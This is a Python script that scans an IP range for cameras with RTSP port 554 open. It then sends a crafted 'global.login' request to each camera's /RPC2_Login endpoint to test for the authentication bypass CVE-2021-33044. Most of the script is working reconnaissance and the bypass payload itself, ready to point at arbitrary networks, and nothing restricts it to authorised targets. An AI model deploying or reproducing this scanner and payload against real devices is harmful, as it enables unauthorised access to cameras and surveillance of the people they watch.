import socket
import time
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.packages import urllib3
import ipaddress
from colorama import init, Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner(banner, color=None):
    if color is not None:
        print("\033[{}m{}\033[0m".format(color, banner))
    else:
        print(banner)

banner =  r"""
>>==============================================================================================================<<
|| ___          ____                                 ____                                   __     __  _   ___  ||
|||_ _|_ __    / ___|__ _ _ __ ___   ___ _ __ __ _  / ___|  ___ __ _ _ __  _ __   ___ _ __  \ \   / / / | / _ \ ||
|| | || '_ \  | |   / _` | '_ ` _ \ / _ \ '__/ _` | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|  \ \ / /  | || | | |||
|| | || |_) | | |__| (_| | | | | | |  __/ | | (_| |  ___) | (_| (_| | | | | | | |  __/ |      \ V /   | || |_| |||
|||___| .__/   \____\__,_|_| |_| |_|\___|_|  \__,_| |____/ \___\__,_|_| |_|_| |_|\___|_|       \_/    |_(_)___/ ||
||    |_|                                                                                                       ||
>>==============================================================================================================<<

"""


def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            return (ip, port)
    except Exception as e:
        print(f"Error scanning port {port} on {ip}: {e}")
    return None

def scan_ip_range(start_ip, stop_ip, ports):
    start_ip_obj = ipaddress.IPv4Address(start_ip)
    stop_ip_obj = ipaddress.IPv4Address(stop_ip)
    
    ip_addr = [str(ipaddress.IPv4Address(ip_int)) for ip_int in range(int(start_ip_obj), int(stop_ip_obj) + 1)]

    results = []
    total_ips = len(ip_addr)
    scanned_ips = 0
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        future_to_ip_port = {
            executor.submit(scan_port, ip, port): (ip, port)
            for ip in ip_addr for port in ports
        }
        for future in concurrent.futures.as_completed(future_to_ip_port):
            scanned_ips += 1
            ip, port = future_to_ip_port[future]
            if (result := future.result()) is not None:
                results.append(result)

                print(f"Progress: {scanned_ips}/{total_ips} IP addresses scanned.", end="\r")

                elapsed_time = time.time() - start_time
                if elapsed_time < 0.01:
                    time.sleep(0.01 - elapsed_time)
                start_time = time.time()

                print(f"Progress: {scanned_ips}/{total_ips} IP addresses scanned.", end="\n", flush=True)
    return results





def validate_ip(ip):
    octets = ip.split('.')
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or not 0 <= int(octet) <= 255:
            return False
    return True

def get_ip(prompt):
    while True:
        ip = input(prompt)
        if validate_ip(ip):
            return ip
        print("Invalid IP address. Please try again.")

while True:

    init()

    print_banner(banner, color=96)

    start_ip = get_ip("Enter the start IP address (e.g., 172.16.28.1): ")
    stop_ip = get_ip("Enter the stop IP address (e.g., 172.16.28.100): ")


    ports = [554] # [554,80,8080]

    store_ip = scan_ip_range(start_ip, stop_ip, ports)

    ip_ADDRESSES_SET = set(ip for ip, _ in store_ip)
    IP_ADDRESSES = list(ip_ADDRESSES_SET)





    print("\nIP Address \t\t Rtsp Port ") # \t Web ui port")
    print("-----------------------------------------------------")
    for ip in sorted(set(ip for ip, port in store_ip)):
        port_554 = next((i_port for i_ip, i_port in store_ip if i_ip == ip and i_port == 554), "-")
       #port_80 = next((i_port for i_ip, i_port in store_ip if i_ip == ip and i_port == 80), "-")
        print(f"{ip:<15} \t {port_554:<8} ") #\t {port_80}")

    print("-----------------------------------------------------")



    Total_camera_found = len(set(ip for ip, port in store_ip))
    print("")
    print("Total camera found = ", Total_camera_found)

    # part 2
    # for finding vulnerable camera from obtained IP_ADDRESSE

    print("")
    user_choice = input("DO you want to Check for vulnerable cameras? CVE-2021-33044 (Enter y/n): ")
    if user_choice.lower() == "y":
        try:
            num_workers = int(input("Enter no of threads (eg:5): "))
        except ValueError:
            print("Invalid input. Enter a valid number")
            exit()

        target_port = 80

        def check_for_vulnerability(ip):
            url = f"http://{ip}:{target_port}"

            headerss = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": url,
                "Referer": url,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }

            post_json = {
                "id": 1,
                "method": "global.login",
                "params": {
                    "authorityType": "Default",
                    "clientType": "NetKeyboard",
                    "loginType": "Direct",
                    "password": "Not Used",
                    "passwordType": "Default",
                    "userName": "admin"
                },
                "session": 0
            }
            try:
                r = requests.post(url + "/RPC2_Login", headers=headerss, json=post_json, verify=False, timeout=3)

                if 'true' in r.content.decode():
                    print(f"{ip:<15}\t\tVulnerable to CVE-2021-33044", end="\n")
                else:
                    print(f"{ip:<15}\t\tNot vulnerable", end="\n")

            except requests.Timeout:
                print(f"{ip:<15}\t\tTimeout cant connect", end="\n")
            except Exception as e:
                print(f"{ip:<15}\t\tError connecting", end="\n")
            
        with ThreadPoolExecutor(max_workers=10) as executor:
            print("")
            print("IP ADDRESS \t\t STATUS ")
            print("----------------------------------------------------")
            for ip in IP_ADDRESSES:
                executor.submit(check_for_vulnerability, ip)






